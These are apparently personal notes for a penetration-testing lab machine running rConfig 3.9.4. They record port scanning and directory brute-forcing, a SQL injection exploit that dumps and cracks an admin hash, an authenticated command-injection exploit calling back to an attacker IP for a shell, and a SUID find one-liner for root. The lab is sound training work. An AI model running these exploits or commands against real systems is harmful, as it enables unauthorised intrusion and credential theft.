nmap shows ports 21 ftp, 22 ssh, 80 web, 111 rpc, 139 smb, 445 smb, 3306 mysql, 8081 web

ftp allows anonymous login, but times out for dir listing
rpc allows anon login, but couldnt find anything
smb allows null session, but no read perms on any share

80 web looks like an experimental page
8081 web has rConfig 3.9.4 running, which has a bunch of exploits
1 is unauthenticated root rce.
2 is authenticated command injection

the unauth_root_rce dint work after fixing it to handle https (by adding verify=False in all the get requests)

`gobuster dir -u https://192.168.233.57:8081 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200 -x txt,zip,php -k` --> run gobuster against https
`feroxbuster -u https://192.168.233.57:8081 -t 64 -v -w /usr/share/wordlists/dirb/common.txt --insecure` --> ferox buster against https

HINT TAKEN :  exploit to use is for 3.9, somehow https://www.exploit-db.com/exploits/48208

this will dump creds for users in the database
So we can try going the mysql way(?) or use exploit 2 to get into the system

`python rConfig_sqli.py https://192.168.233.57:8081`
gives us `admin:1:dc40b85276a1f4d7cb35f154236aa1b2`
hash type identifier tells us it is md5, not decrypted by john
crackstation.net cracks it as abgrtyu

now that we have password for admin, we can use the authenticated code injection php/webapps/48241.py

`python search.crud_commaind_inj.py https://192.168.233.57:8081 admin abgrtyu 192.168.45.168 80`
make sure to use ports like 80, and not 1234
apache!

---
SUID check showed find had SUID set on it, gtfo bins
`find . -exec /bin/sh -p \; -quit`

root!

---
---
---
The intended way is to bruteforce the admin creds, and rockyou doesnt work. you need to use /usr/share/wordlists/seclists/Passwords/Common-Credentials/500-worst-passwords.txt
What a joke!

